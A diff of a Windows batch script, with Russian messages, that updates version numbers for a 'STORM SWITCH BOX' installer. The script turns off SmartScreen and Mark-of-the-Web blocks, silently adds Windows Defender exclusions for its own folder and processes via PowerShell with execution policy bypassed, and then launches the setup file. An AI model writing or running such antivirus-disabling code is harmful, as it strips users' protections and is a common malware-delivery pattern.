@@ -13,7 +13,7 @@ if %errorLevel% neq 0 (
 )
 
 echo ============================================================
-echo   STORM SWITCH BOX v4.8.9 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   STORM SWITCH BOX v4.9.0 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
 echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
@@ -74,7 +74,7 @@ echo [OK] Все файлы в директории успешно разбло�
 :: ============================================================
 echo.
 echo [4/5] Добавление папки программы в исключения Защитника Windows...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.8.9_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\STORM SWITCH BOX' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSwitchBox.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SWITCH_BOX_4.9.0_Setup.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormInstaller.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 echo [OK] Исключения в Защитник Windows успешно добавлены!
 
 :: ============================================================
@@ -88,12 +88,12 @@ echo   ГОТОВО! Все ограничения успешно сняты.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.8.9_Setup.exe" (
-    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.8.9_Setup.exe"
-) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.8.9_Setup.exe" (
-    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.8.9_Setup.exe"
-) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.8.9_Setup.exe" (
-    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.8.9_Setup.exe"
+if exist "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.9.0_Setup.exe" (
+    start "" "%SCRIPT_DIR%Files\STORM_SWITCH_BOX_4.9.0_Setup.exe"
+) else if exist "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.9.0_Setup.exe" (
+    start "" "%SCRIPT_DIR%installer\Output\STORM_SWITCH_BOX_4.9.0_Setup.exe"
+) else if exist "%SCRIPT_DIR%STORM_SWITCH_BOX_4.9.0_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_SWITCH_BOX_4.9.0_Setup.exe"
 ) else if exist "%SCRIPT_DIR%Assembling\StormSwitchBox.exe" (
     start "" "%SCRIPT_DIR%Assembling\StormSwitchBox.exe"
 )
